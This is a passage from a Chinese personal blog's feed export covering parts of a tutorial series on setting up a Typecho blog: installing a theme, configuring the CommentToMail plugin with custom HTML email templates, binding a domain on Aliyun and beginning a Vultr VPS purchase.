data-url="aHR0cHM6Ly9yYXZlbnhyei5pbmsvYXJjaGl2ZXMvZnJvbS1zY3JhdGNoLWJ1aWxkLXlvdXItb3duLWJsb2ctc2VyaWVzLXR1dG9yaWFsLXRocmVlLXRoZW1lLXNlbGVjdGlvbi1hbmQtaW50cm9kdWN0aW9uLW9mLWNjb21tZW50b21haWwtcGx1Z2luLmh0bWw=" title="https://ravenxrz.ink/archives/from-scratch-build-your-own-blog-series-tutorial-three-theme-selection-and-introduction-of-ccommentomail-plugin.html">从零开始搭建属于自己的博客系列教程三 – 主题选择与CommentToMail插件介绍<i class="fa fa-external-link"></i></span></li><li><a href="https://www.ravenxrz.ink/archives/build-your-own-blog-tutorial-series-from-scratch-4-remove-annoying-index-php-suffixes-and-introductions-to-common-plugins-1.html">从零开始搭建属于自己的博客系列教程四 – 去掉烦人的index.php后缀与常用插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/starting-from-scratch-to-build-your-own-blog-series-of-tutorials-5-graphic-bed-selection-and-blog-migration.html">从零开始搭建属于自己的博客系列教程五 – 图床选择与博客迁移</a></li><li><a href="https://www.ravenxrz.ink/archives/start-from-scratch-to-build-your-own-blog-series-of-tutorials-vi-blog-system-backup.html">从零开始搭建属于自己的博客系列教程六 – 博客系统备份</a></li><li><span class="exturl" data-url="aHR0cHM6Ly9yYXZlbnhyei5pbmsvYXJjaGl2ZXMvc3RhcnQtZnJvbS1zY3JhdGNoLXRvLWJ1aWxkLXlvdXItb3duLWJsb2ctc2VyaWVzLW9mLXR1dG9yaWFscy03LW9wZW4tdGhlLXdob2xlLXNpdGUtaHR0cHMuaHRtbA==" title="https://ravenxrz.ink/archives/start-from-scratch-to-build-your-own-blog-series-of-tutorials-7-open-the-whole-site-https.html">从零开始搭建属于自己的博客系列教程七 – 开启全站HTTPS<i class="fa fa-external-link"></i></span></li></ul><a id="more"></a><h2 id="2-主题选择"><a href="#2-主题选择" class="headerlink" title="2. 主题选择"></a>2. 主题选择</h2><h3 id="2-1-主题选择"><a href="#2-1-主题选择" class="headerlink" title="2.1  主题选择"></a>2.1  主题选择</h3><p>typecho不像wordpress支持在线安装主题，但是手动安装方法也很简单。下面这里以我安装的主题为例，特别<span class="exturl" data-url="aHR0cHM6Ly9lcmlyaS5pbmsv" title="https://eriri.ink/">感谢作者将主题开源<i class="fa fa-external-link"></i></span>，介绍两种方法</p><p>再给一个typecho主题站：<span class="exturl" data-url="aHR0cHM6Ly90eXBlY2hvLm1lLw==" title="https://typecho.me/">https://typecho.me/<i class="fa fa-external-link"></i></span></p><h3 id="2-1-1-Git-方式"><a href="#2-1-1-Git-方式" class="headerlink" title="2.1.1 Git 方式"></a>2.1.1 Git 方式</h3><p>很多个人主题开发者都对其主题进行了开源，可以在从Github上clone下来，这样更新就很方便了（git pull就行）。</p><p>具体的安装方法如下：</p><ul><li>找到开源地址，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NpcGhpbHMvVHlwZWNoby1UaGVtZS1BcmlhLmdpdA==" title="https://github.com/Siphils/Typecho-Theme-Aria.git">https://github.com/Siphils/Typecho-Theme-Aria.git<i class="fa fa-external-link"></i></span></li><li>进入<code>typecho</code>安装目录下的<code>usr/themes</code><ul><li><code>cd /home/wwwroot/default/usr/themes</code></li></ul></li><li>执行 <code>git clone https://github.com/Siphils/Typecho-Theme-Aria.git</code></li><li>打开的博客后台控制面板，进入主题然后开启即可。</li><li><img data-src="https://pic.superbed.cn/item/5cfbaccc451253d178d941eb.png"></li></ul><h3 id="2-1-2-下载安装包的方式"><a href="#2-1-2-下载安装包的方式" class="headerlink" title="2.1.2 下载安装包的方式"></a>2.1.2 下载安装包的方式</h3><p>安装方式如下：</p><ul><li>找到下载链接：<span class="exturl" data-url="aHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL1NpcGhpbHMvVHlwZWNoby1UaGVtZS1BcmlhL3ppcC9tYXN0ZXI=" title="https://codeload.github.com/Siphils/Typecho-Theme-Aria/zip/master">https://codeload.github.com/Siphils/Typecho-Theme-Aria/zip/master<i class="fa fa-external-link"></i></span></li><li>进入<code>typecho</code>安装目录下的<code>usr/themes</code> <ul><li><code>cd /home/wwwroot/default/usr/themes</code></li></ul></li><li>执行 <code>wget https://codeload.github.com/Siphils/Typecho-Theme-Aria/zip/master</code></li><li>解压对应压缩包 <code>unzip xxx.zip</code>。没有unzip命令，请自行安装。</li><li>有些包可能需要更改名字，看作者说明。</li><li>打开的博客后台控制面板，进入主题然后开启即可。</li></ul><h2 id="3-CommentToMail插件介绍"><a href="#3-CommentToMail插件介绍" class="headerlink" title="3. CommentToMail插件介绍"></a>3. CommentToMail插件介绍</h2><h3 id="3-1-CommentToMail-安装与设置"><a href="#3-1-CommentToMail-安装与设置" class="headerlink" title="3.1 CommentToMail 安装与设置"></a>3.1 CommentToMail 安装与设置</h3><p>通过主题安装，你已经有自己喜欢的主题了。</p><p>现在想象一个场景，somebody想要给你的博文加点评论，但是你的网站可不能像简书、<code>csdn</code>一样给你推送，你回信后也没办法通知对方。那么该怎么样才能让双方都得到及时的通知呢? 好在有大佬开发了·CommentToMail`插件，这个插件通过邮件通知双方。</p><p>网上普遍流行的<code>CommentToMail</code>配置上分两步，一个是<code>CommentToMail</code>自己插件的配置，如SMTP配置，另一个是定时检索评论并发送邮件。这样有点繁琐，涉及到crontab设置。好在有篇博客（实在找不到那篇博文了，没办法贴出链接）给出了一个集成的插件:<span class="exturl" data-url="aHR0cHM6Ly93d3cubW9lcmF0cy5jb20vdXNyL2Rvd24vQ29tbWVudFRvTWFpbC0yLjEuMC56aXA=" title="https://www.moerats.com/usr/down/CommentToMail-2.1.0.zip">https://www.moerats.com/usr/down/CommentToMail-2.1.0.zip<i class="fa fa-external-link"></i></span></p><p>安装方法和主题安装方法一样，只不过需要进入<code>usr/plugins</code>目录下安装，然后在控制面板开启即可。现在讲讲一些设置:</p><p><img data-src="https://pic3.superbed.cn/item/5cfbaccd451253d178d94224.png"></p><p>进入<code>QQ</code>邮箱设置，账户设置:</p><p><img data-src="https://pic.superbed.cn/item/5cfbacce451253d178d9425b.png"></p><p>会提示你发送短信，发送短信后会得到一串密码，然后复制到上上图中去。注意其中标注的框就好了。</p><p>最后就是自己测试一下咯。</p><h3 id="3-2-CommentToMail界面优化"><a href="#3-2-CommentToMail界面优化" class="headerlink" title="3.2 CommentToMail界面优化"></a>3.2 CommentToMail界面优化</h3><p>如果你对发送与接收的邮件中的界面感觉到不足，可对其进行优化。感谢<a href="https://www.zrahh.com/archives/173.html/comment-page-1#comment-1266"><strong>左岸</strong></a>提供的模板。</p><p>自己接收到的效果图如下:</p><p><img data-src="https://www.zrahh.com/usr/uploads/2019/02/971238368.png?imageView2/2/w/1366/q/75/format/webp"></p><p>更改CommentToMail设置中的owner.html</p><p><img data-src="https://pic.superbed.cn/item/5cfbacd0451253d178d94290.png"></p><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;width: 550px;height: auto;border-radius: 5px;margin:0 auto;border:1px solid #ffb0b0;box-shadow: 0px 0px 20px #888888;position: relative;&quot;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;background-image: url(https:&#x2F;&#x2F;cdn.zrahh.com&#x2F;img&#x2F;mail.png);width:550px;height: 250px;background-size: cover;background-repeat: no-repeat;border-radius: 5px 5px 0px 0px;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;background-color:white;line-height:180%;padding:0 15px 12px;width:520px;margin:10px auto;color:#555555;font-family:&#39;Century Gothic&#39;,&#39;Trebuchet MS&#39;,&#39;Hiragino Sans GB&#39;,微软雅黑,&#39;Microsoft Yahei&#39;,Tahoma,Helvetica,Arial,&#39;SimSun&#39;,sans-serif;font-size:12px;margin-bottom: 0px;&quot;&gt;</span><br><span class="line">        &lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;&lt;span style&#x3D;&quot;color: #12ADDB;font-weight: bold;&quot;&gt;&gt; &lt;&#x2F;span&gt;您的文章&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;&#123;permalink&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;《&#123;title&#125;》&lt;&#x2F;a&gt;有了新的回复耶~&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;</span><br><span class="line">        &lt;p&gt;时间：&lt;span style&#x3D;&quot;border-bottom:1px dashed #ccc;&quot; t&#x3D;&quot;5&quot; times&#x3D;&quot; 20:42&quot;&gt;&#123;time&#125;&lt;&#x2F;span&gt;&lt;&#x2F;p&gt; </span><br><span class="line">            &lt;p&gt;&lt;strong&gt;&#123;author&#125;&lt;&#x2F;strong&gt;&amp;nbsp;给您的评论：&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;p style&#x3D;&quot;background-color: #f5f5f5;border: 0px solid #DDD;padding: 10px 15px;margin:18px 0&quot;&gt;&#123;text&#125;&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;p&gt;其他信息：&lt;&#x2F;p&gt;</span><br><span class="line">            &lt;p style&#x3D;&quot;background-color: #f5f5f5;border: 0px solid #DDD;padding: 10px 15px;margin:18px 0&quot;&gt;IP：&#123;ip&#125;&lt;br &#x2F;&gt;邮箱：&lt;a href&#x3D;&quot;mailto:&#123;mail&#125;&quot;&gt;&#123;mail&#125;&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;状态：&#123;status&#125; [&lt;a href&#x3D;&#39;&#123;manage&#125;&#39; target&#x3D;&#39;_blank&#39;&gt;管理评论&lt;&#x2F;a&gt;]&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;a style&#x3D;&quot;text-decoration: none;color: rgb(255, 255, 255);width: 40%;text-align: center;background-color: rgb(145, 165, 165);height: 40px;line-height: 40px;box-shadow: 3px 3px 3px rgba(0, 0, 0, 0.3);display: block;margin: auto;&quot; href&#x3D;&quot;&#123;permalink&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;color:#8c8c8c;;font-family: &#39;Century Gothic&#39;,&#39;Trebuchet MS&#39;,&#39;Hiragino Sans GB&#39;,微软雅黑,&#39;Microsoft Yahei&#39;,Tahoma,Helvetica,Arial,&#39;SimSun&#39;,sans-serif;font-size: 10px;width: 100%;text-align: center;&quot;&gt;</span><br><span class="line">        &lt;p&gt;©2017-2019 Copyright &#123;author&#125;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>再来看接收方的效果图</p><p><img data-src="https://www.zrahh.com/usr/uploads/2019/02/3161372288.png?imageView2/2/w/1366/q/75/format/webp"></p><p>更改guest.html文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;width: 550px;height: auto;border-radius: 5px;margin:0 auto;border:1px solid #ffb0b0;box-shadow: 0px 0px 20px #888888;position: relative;padding-bottom: 5px;&quot;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;background-image: url(https:&#x2F;&#x2F;cdn.zrahh.com&#x2F;img&#x2F;mail.png);width:550px;height: 250px;background-size: cover;background-repeat: no-repeat;border-radius: 5px 5px 0px 0px;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;width: 200px;height: 40px;background-color: #91a5a5;margin-top: -20px;margin-left: 20px;box-shadow: 3px 3px 3px rgba(0, 0, 0, 0.3);color: rgb(255, 255, 255);text-align: center;line-height: 40px;&quot;&gt;Dear: &#123;author_p&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;background-color:white;line-height:180%;padding:0 15px 12px;width:520px;margin:30px auto;color:#555555;font-family:&#39;Century Gothic&#39;,&#39;Trebuchet MS&#39;,&#39;Hiragino Sans GB&#39;,微软雅黑,&#39;Microsoft Yahei&#39;,Tahoma,Helvetica,Arial,&#39;SimSun&#39;,sans-serif;font-size:12px;margin-bottom: 0px;&quot;&gt;  </span><br><span class="line">        &lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;&lt;span style&#x3D;&quot;color: #12ADDB;font-weight: bold;&quot;&gt;&gt; &lt;&#x2F;span&gt;您在&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;&#123;permalink&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;《&#123;title&#125;》&lt;&#x2F;a&gt;的评论有了新的回复呐~&lt;&#x2F;h2&gt;  </span><br><span class="line">        &lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;  </span><br><span class="line">            &lt;p&gt;时间：&lt;span style&#x3D;&quot;border-bottom:1px dashed #ccc;&quot; t&#x3D;&quot;5&quot; times&#x3D;&quot; 20:42&quot;&gt;&#123;time&#125;&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;          </span><br><span class="line">            &lt;p&gt;您的评论：&lt;&#x2F;p&gt;  </span><br><span class="line">            &lt;p style&#x3D;&quot;background-color: #f5f5f5;border: 0px solid #DDD;padding: 10px 15px;margin:18px 0&quot;&gt;&#123;text_p&#125;&lt;&#x2F;p&gt;  </span><br><span class="line">            &lt;p&gt;&lt;strong&gt;&#123;author&#125;&lt;&#x2F;strong&gt;&amp;nbsp;给您的回复：&lt;&#x2F;p&gt;  </span><br><span class="line">            &lt;p style&#x3D;&quot;background-color: #f5f5f5;border: 0px solid #DDD;padding: 10px 15px;margin:18px 0&quot;&gt;&#123;text&#125;&lt;&#x2F;p&gt;  </span><br><span class="line">        &lt;&#x2F;div&gt;  </span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;color:#8c8c8c;;font-family: &#39;Century Gothic&#39;,&#39;Trebuchet MS&#39;,&#39;Hiragino Sans GB&#39;,微软雅黑,&#39;Microsoft Yahei&#39;,Tahoma,Helvetica,Arial,&#39;SimSun&#39;,sans-serif;font-size: 10px;width: 100%;text-align: center;word-wrap:break-word;margin-top: -30px;&quot;&gt;</span><br><span class="line">        &lt;p style&#x3D;&quot;padding:20px;&quot;&gt;萤火虫消失之后，那光的轨迹仍久久地印在我的脑际。那微弱浅淡的光点，仿佛迷失方向的魂灵，在漆黑厚重的夜幕中彷徨。——《挪威的森林》村上村树&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;a style&#x3D;&quot;text-decoration:none; color:#FFF;width: 40%;text-align: center;background-color:#91a5a5;height: 40px;line-height: 35px;box-shadow: 3px 3px 3px rgba(0, 0, 0, 0.30);margin: -10px auto;display: block;&quot; href&#x3D;&quot;&#123;permalink&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;color:#8c8c8c;;font-family: &#39;Century Gothic&#39;,&#39;Trebuchet MS&#39;,&#39;Hiragino Sans GB&#39;,微软雅黑,&#39;Microsoft Yahei&#39;,Tahoma,Helvetica,Arial,&#39;SimSun&#39;,sans-serif;font-size: 10px;width: 100%;text-align: center;margin-top: 30px;&quot;&gt;</span><br><span class="line">        &lt;p&gt;本邮件为系统自动发送，请勿直接回复~&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;color:#8c8c8c;;font-family: &#39;Century Gothic&#39;,&#39;Trebuchet MS&#39;,&#39;Hiragino Sans GB&#39;,微软雅黑,&#39;Microsoft Yahei&#39;,Tahoma,Helvetica,Arial,&#39;SimSun&#39;,sans-serif;font-size: 10px;width: 100%;text-align: center;&quot;&gt;</span><br><span class="line">        &lt;p&gt;©2017-2019 Copyright &#123;author&#125;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p><strong>由于我在使用的时候，接收方不会受到邮件，经过反复排查，发现中间Dear xxx有问题，所以将其删除，最后得到可用的代码如下:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style&#x3D;&quot;width: 550px;height: auto;border-radius: 5px;margin:0 auto;border:1px solid #12ADDB;box-shadow: 0px 0px 20px #888888;position: relative;padding-bottom: 5px;&quot;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;background-image: url(https:&#x2F;&#x2F;wallroom.io&#x2F;img&#x2F;1920x1200&#x2F;bg-e4aaddb.jpg);width:550px;height: 250px;background-size: cover;background-repeat: no-repeat;border-radius: 5px 5px 0px 0px;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style&#x3D;&quot;background-color:white;padding:0 15px 12px;width:500px;margin-left:50px auto;</span><br><span class="line">margin-right: 50px auto;</span><br><span class="line">color:#555555;font-family:&#39;Century Gothic&#39;,&#39;Trebuchet MS&#39;,&#39;Hiragino Sans GB&#39;,微软雅黑,&#39;Microsoft Yahei&#39;,Tahoma,Helvetica,Arial,&#39;SimSun&#39;,sans-serif;font-size:16px;&quot;&gt;  </span><br><span class="line">&lt;!--font-size:控制评标题大小--&gt;        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:20px;font-weight:normal;padding:13px 0 10px 8px;&quot;&gt;&lt;span style&#x3D;&quot;color: #12ADDB;font-weight: bold;&quot;&gt;&gt; &lt;&#x2F;span&gt;您(&#123;author_p&#125;)在&lt;a style&#x3D;&quot;text-decoration:none;color: #12ADDB;&quot; href&#x3D;&quot;&#123;permalink&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;《&#123;title&#125;》&lt;&#x2F;a&gt;的评论有了新的回复&lt;&#x2F;h1&gt;  </span><br><span class="line">        &lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt;  </span><br><span class="line">            &lt;p&gt;时间：&lt;span style&#x3D;&quot;border-bottom:2px dashed #ccc;&quot; t&#x3D;&quot;5&quot; times&#x3D;&quot; 20:42&quot;&gt;&#123;time&#125;&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;  </span><br><span class="line">          </span><br><span class="line">&lt;p&gt;你的评论：&lt;&#x2F;p&gt;  </span><br><span class="line">            &lt;p style&#x3D;&quot;background-color: #f5f5f5;border: 0px solid #DDD;padding: 10px 15px;margin:18px 0&quot;&gt;&#123;text_p&#125;&lt;&#x2F;p&gt;  </span><br><span class="line">            &lt;p&gt;&lt;strong&gt;&#123;author&#125;&lt;&#x2F;strong&gt;&amp;nbsp;回复说：&lt;&#x2F;p&gt;  </span><br><span class="line">            &lt;p style&#x3D;&quot;background-color: #f5f5f5;border: 0px solid #DDD;padding: 10px 15px;margin:18px 0&quot;&gt;&#123;text&#125;&lt;&#x2F;p&gt;  </span><br><span class="line">&lt;!--font-size:控制评论底部大小--&gt;               </span><br><span class="line">             &lt;p style&#x3D;&quot;font-size:17px&quot;&gt;您可以点击 &lt;a style&#x3D;&quot;text-decoration:none; color:#12ADDB&quot; href&#x3D;&quot;&#123;permalink&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;查看回复的完整內容 &lt;&#x2F;a&gt;，本邮件为自动发送，请勿回信，如有疑问，请联系我&lt;a style&#x3D;&quot;text-decoration:none; color:#12ADDB&quot;  href&#x3D;&quot;zhang.xingrui@foxmail.com&quot; target&#x3D;&quot;_blank&quot;&gt;zhang.xingrui@foxmail.com&lt;&#x2F;a&gt;，欢迎再次光临 &lt;a style&#x3D;&quot;text-decoration:none; color:#12ADDB&quot; href&#x3D;&quot;https:&#x2F;&#x2F;www.ravenxrz.ink&quot; target&#x3D;&quot;_blank&quot;&gt;Raven&#39;s Blog &lt;&#x2F;a&gt;。&lt;&#x2F;p&gt;  </span><br><span class="line"></span><br><span class="line">        &lt;p style&#x3D;&quot;text-align: center;&quot;&gt;©2019 Copyright &#123;author&#125;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;  </span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>OK,这篇博文就这样了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuenJhaGguY29tL2FyY2hpdmVzLzE3My5odG1sL2NvbW1lbnQtcGFnZS0xI2NvbW1lbnQtMTI2Ng==" title="https://www.zrahh.com/archives/173.html/comment-page-1#comment-1266">推荐一款 CommentToMail 邮件插件的模板<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建属于自己的博客系列教程二-域名绑定</title>
      <link href="/archives/1cbfa5af.html"/>
      <url>/archives/1cbfa5af.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-写在最前面"><a href="#1-写在最前面" class="headerlink" title="1.  写在最前面"></a>1.  写在最前面</h2><blockquote><p>折腾了整整一个五一，总算是完成了自己的博客系统。为了给想要搭建自己的博客，但是又和我一样是技术小白的人铺点路，所以准备开个博客搭建的系列教程，避免后来人像我一样走了一大堆弯路。</p></blockquote><p>先贴上自己的博客网站：<a href="https://www.ravenxrz.ink/">https://www.ravenxrz.ink</a>   </p><a id="more"></a><p>系列教程目录：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b5eb44b9.html">从零开始搭建属于自己的博客系列教程零 – 绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/4c781aa7.html">从零开始搭建属于自己的博客系列教程一 – 博客系统搭建</a></li><li><a href="https://www.ravenxrz.ink/archives/1cbfa5af.html">从零开始搭建属于自己的博客系列教程二 – 域名绑定</a></li><li><a href="https://www.ravenxrz.ink/archives/9f4d945c.html">从零开始搭建属于自己的博客系列教程三 – 主题选择与CommentToMail插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/e8deae94.html">从零开始搭建属于自己的博客系列教程四 – 去掉烦人的index.php后缀与常用插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/3cc5aa32.html">从零开始搭建属于自己的博客系列教程五 – 图床选择与博客迁移</a></li><li><a href="https://www.ravenxrz.ink/archives/11c4d80.html">从零开始搭建属于自己的博客系列教程六 – 博客系统备份</a></li><li><a href="https://www.ravenxrz.ink/archives/1eb3d9.html">从零开始搭建属于自己的博客系列教程七 – 开启全站HTTPS</a><h2 id="2-域名绑定"><a href="#2-域名绑定" class="headerlink" title="2. 域名绑定"></a>2. 域名绑定</h2></li></ul><p>本篇讲解如何购买域名与绑定。</p><h3 id="2-1-域名购买"><a href="#2-1-域名购买" class="headerlink" title="2.1 域名购买"></a>2.1 域名购买</h3><p>我是在阿里上购买：<span class="exturl" data-url="aHR0cHM6Ly93YW53YW5nLmFsaXl1bi5jb20v" title="https://wanwang.aliyun.com/">https://wanwang.aliyun.com/<i class="fa fa-external-link"></i></span> </p><p>购买的操作这里就不写了，选定合适域名，支付即可，需要实名认证。</p><h3 id="2-2-域名绑定"><a href="#2-2-域名绑定" class="headerlink" title="2.2 域名绑定"></a>2.2 域名绑定</h3><p>然后就到了域名和ip绑定的阶段。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5b1451253d178d9cd55.png"></p><p><img data-src="https://pic.superbed.cn/item/5cfbb5b2451253d178d9cd8d.png"></p><p>需要添加两条记录：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb5b9451253d178d9ce06.png"></p><p>仿照上图，再添加一个www的记录。这样域名解析时，既可以使用<code>ravenxrz.ink</code>也可以使用<code>www.ravenxrz.ink</code>。</p><p>填完后也不是立即能够解析的，需要一定的时间才能提交到DNS服务器，据官网介绍需要48小时才能全球同步，我是在5小时后发现能够使用域名登陆的。</p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从零开始搭建属于自己的博客系列教程一-博客系统搭建</title>
      <link href="/archives/4c781aa7.html"/>
      <url>/archives/4c781aa7.html</url>
      
        <content type="html"><![CDATA[<p>[Meting]<br>[Music server=”netease” id=”4937357” type=”song”/]<br>[/Meting]</p><h2 id="1-写在最前面"><a href="#1-写在最前面" class="headerlink" title="1.  写在最前面"></a>1.  写在最前面</h2><a id="more"></a><blockquote><p>折腾了整整一个五一，总算是完成了自己的博客系统。为了给想要搭建自己的博客，但是又和我一样是技术小白的人铺点路，所以准备开个博客搭建的系列教程，避免后来人像我一样走了一大堆弯路。</p></blockquote><p>先贴上自己的博客网站：<a href="https://www.ravenxrz.ink/">https://www.ravenxrz.ink</a>   </p><p>系列教程目录：</p><ul><li><a href="https://www.ravenxrz.ink/archives/b5eb44b9.html">从零开始搭建属于自己的博客系列教程零 – 绪论</a></li><li><a href="https://www.ravenxrz.ink/archives/4c781aa7.html">从零开始搭建属于自己的博客系列教程一 – 博客系统搭建</a></li><li><a href="https://www.ravenxrz.ink/archives/1cbfa5af.html">从零开始搭建属于自己的博客系列教程二 – 域名绑定</a></li><li><a href="https://www.ravenxrz.ink/archives/9f4d945c.html">从零开始搭建属于自己的博客系列教程三 – 主题选择与CommentToMail插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/e8deae94.html">从零开始搭建属于自己的博客系列教程四 – 去掉烦人的index.php后缀与常用插件介绍</a></li><li><a href="https://www.ravenxrz.ink/archives/3cc5aa32.html">从零开始搭建属于自己的博客系列教程五 – 图床选择与博客迁移</a></li><li><a href="https://www.ravenxrz.ink/archives/11c4d80.html">从零开始搭建属于自己的博客系列教程六 – 博客系统备份</a></li><li><a href="https://www.ravenxrz.ink/archives/1eb3d9.html">从零开始搭建属于自己的博客系列教程七 – 开启全站HTTPS</a></li></ul><h2 id="2-正式搭建"><a href="#2-正式搭建" class="headerlink" title="2.  正式搭建"></a>2.  正式搭建</h2><h3 id="2-1-系统环境准备"><a href="#2-1-系统环境准备" class="headerlink" title="2.1  系统环境准备"></a>2.1  系统环境准备</h3><ul><li>域名（可选，但是最好买上，可参考本系列教程二购买）</li><li>国内或国外服务器（国内需要备案，但是备案有备案的好处，后续的图床CDN加速就需要国内备案服务器）</li><li>XShell6</li></ul><h3 id="2-2-服务器购买"><a href="#2-2-服务器购买" class="headerlink" title="2.2  服务器购买"></a>2.2  服务器购买</h3><p><strong>这里推荐使用vultr，国外服务器，无需备案，vultr按小时计费，且可无限次更换ip。</strong></p><p>step1: 点击<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsdHIuY29tLz9yZWY9Nzc0NDEyOQ==" title="https://www.vultr.com/?ref=7744129">我的vultr推广<i class="fa fa-external-link"></i></span> （希望小伙伴支持一下啦~），去<span class="exturl" data-url="aHR0cHM6Ly9teS52dWx0ci5jb20v" title="https://my.vultr.com/">vultr官网<i class="fa fa-external-link"></i></span>注册一个账号，并充值，支持支付宝、微信，最低充值10美元。</p><p><img data-src="https://pic.superbed.cn/item/5cfbacd2451253d178d942d3.png" alt="vultr充值"></p><p>step2: 购买一个vps，尽量选择离大陆近的，这里以日本为例，按图示配置（如果有更便宜选项，也可以选购）</p><p><img data-src="https://pic.superbed.cn/item/5cfbacd3451253d178d9431e.png"></p><p><img data-src="https://pic.superbed.cn/item/5cfbacd5451253d178d9435e.png"></p><p>step3: 稍等片刻后，即可以在Servers选项栏中看到你购买的vps，购买后还未完，我们需要测试它是否能够连接上，复制你的ip地址（如图）。</p><p><img data-src="https://pic.superbed.cn/item/5cfbacd7451253d178d943a5.png"></p><p>进入这个端口扫描网站：<span class="exturl" data-url="aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9wb3J0Lw==" title="http://tool.chinaz.com/port/">http://tool.chinaz.com/port/<i class="fa 